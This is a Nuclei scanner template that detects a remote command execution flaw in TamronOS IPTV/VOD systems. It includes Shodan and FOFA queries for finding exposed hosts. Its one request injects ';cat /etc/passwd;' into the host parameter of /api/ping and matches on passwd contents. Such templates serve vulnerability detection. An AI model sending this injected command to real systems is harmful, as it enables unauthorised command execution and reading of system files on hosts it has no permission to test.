id: tamronos-rce

info:
  name: TamronOS IPTV/VOD - 远程命令执行漏洞
  author: pikpikcu
  severity: critical
  description: TamronOS IPTV/VOD - 远程命令执行 存在远程命令执行漏洞。攻击者在无需授权或仅需较低权限的情况下，可能在目标主机上执行任意命令并完全控制系统。
  reference:
    - https://twitter.com/sec715/status/1405336456923471874
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-78
    cpe: cpe:2.3:o:tamronos:tamronos:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"TamronOS IPTV系统"
    fofa-query: title="TamronOS IPTV系统"
    product: tamronos
    vendor: tamronos
  tags: tamronos,rce,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/ping?count=5&host=;cat%20/etc/passwd;&port=80&source=1.1.1.1&type=icmp"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
